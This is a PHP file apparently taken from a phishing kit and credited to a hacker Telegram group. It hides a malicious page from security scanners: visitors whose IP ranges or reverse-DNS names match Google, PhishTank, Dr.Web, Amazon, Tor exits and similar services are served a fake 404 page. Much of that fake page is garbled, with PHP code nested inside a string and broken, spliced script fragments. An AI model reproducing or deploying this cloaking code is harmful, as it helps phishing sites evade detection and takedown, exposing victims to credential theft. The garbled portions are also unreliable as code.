<?php
/*   
TELEGRAM @H4x0rxploit
JOIN US AT TELEGRAM GROUP : https://t.me/H4x0rxploits
*/



$Megakalar = $_SERVER['REMOTE_ADDR'];
 $Claritik = array(
     "^66.102.*.*",
     "^38.100.*.*",
     "^107.170.*.*",
     "^149.20.*.*",
     "^38.105.*.*",
     "^74.125.*.*",
     "^66.150.14.*",
     "^54.176.*.*",
     "^38.100.*.*",
     "^184.173.*.*",
     "^66.249.*.*",
     "^128.242.*.*",
     "^72.14.192.*",
     "^208.65.144.*",
     "^74.125.*.*",
     "^209.85.128.*",
     "^216.239.32.*",
     "^74.125.*.*",
     "^207.126.144.*",
     "^173.194.*.*",
     "^64.233.160.*",
     "^72.14.192.*",
     "^66.102.*.*",
     "^64.18.*.*",
     "^194.52.68.*",
     "^194.72.238.*",
     "^62.116.207.*",
     "^212.50.193.*",
     "^69.65.*.*",
     "^50.7.*.*",
     "^131.212.*.*",
     "^46.116.*.* ",
     "^62.90.*.*",
     "^89.138.*.*",
     "^82.166.*.*",
     "^85.64.*.*",
     "^85.250.*.*",
     "^89.138.*.*",
     "^93.172.*.*",
     "^109.186.*.*",
     "^194.90.*.*",
     "^212.29.192.*",
     "^212.29.224.*",
     "^212.143.*.*",
     "^212.150.*.*",
     "^212.235.*.*",
     "^217.132.*.*",
     "^50.97.*.*",
     "^217.132.*.*",
     "^209.85.*.*",
     "^66.205.64.*",
     "^204.14.48.*",
     "^64.27.2.*",
     "^67.15.*.*",
     "^202.108.252.*",
     "^193.47.80.*",
     "^64.62.136.*",
     "^66.221.*.*",
     "^64.62.175.*",
     "^198.54.*.*",
     "^192.115.134.*",
     "^216.252.167.*",
     "^193.253.199.*",
     "^69.61.12.*",
     "^64.37.103.*",
     "^38.144.36.*",
     "^64.124.14.*",
     "^206.28.72.*",
     "^209.73.228.*",
     "^158.108.*.*",
     "^168.188.*.*",
     "^66.207.120.*",
     "^167.24.*.*",
     "^192.118.48.*",
     "^67.209.128.*",
     "^12.148.209.*",
     "^12.148.196.*",
     "^193.220.178.*",
     "68.65.53.71",
     "^198.25.*.*",
     "^64.106.213.*",
     "54.228.218.117",
     "^54.228.218.*",
     "185.28.20.243",
     "^185.28.20.*",
     "217.16.26.166",
     "158.191.0.*",
     "185.187.30.*",
     "^217.16.26.*"
 );
if(in_array($Megakalar,$Claritik)){
    $errors = '<h1>404 Not Found</h1>The page that you have requested could not be found.<br>';
   // $errors .= gethostbyaddr($_SERVER['REMOTE_ADDR']).'<br>';
  // $errors .= php_uname();
    die($errors);
}
$carisef = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$disprine = array("drweb","Dr.Web","hostinger","scanurl","above","google","facebook","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit",);
foreach($disprine as $word) {
    if (substr_count($carisef, $word) > 0) {
    header('HTTP/1.0 404 Not Found');
                die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
header("Pragma: no-cache");

// Prevent Google Archiving
header("X-Robots-Tag: noarchive");

// Block email scanning
header("X-Content-Type-Options: nosniff");

// Disable listeners and log third-party communications
ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");


// Logging third-party communication attempts
$logFile = "../../../requests.txt"; // Replace with the path to your log file

// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");

// Get the IP address of the client
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get the requested URL
$requestUrl = $_SERVER['REQUEST_URI'];

// Create the log message
$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";

// Append the log message to the log file
file_put_contents($logFile, $logMessage, FILE_APPEND);
?>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html><head><title>404 Not Found</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    function logThirdPartyCommunication() {
      // Logging third-party communication attempts
      const timestamp = new Date().toISOString();
      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
      const requestedUrl = window.location.href;
      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;

      // Specify the log file location
      const logFile = "../../../requests.txt"; // Replace with the actual log file location

      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
      const logRequest = new XMLHttpRequest();
      logRequest.open('POST', logFile, true);
      logRequest.setRequestHeader('Content-Type', 'text/plain');
      logRequest.send(logMessage);
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html></html><s</html>etTimeout(function() { if (screen.width >= 600) { window.location = '/index.php'; } }, 100);</script><script>s</html>ut(function() { if (screen.width >= 600) { window.location = '/index.php'; } }, 1);</script></html><script>set</html>(function() { if (screen.width >= 600) { window.location = '/index.php'; } }, 100);</script></html></html>');

    }
}

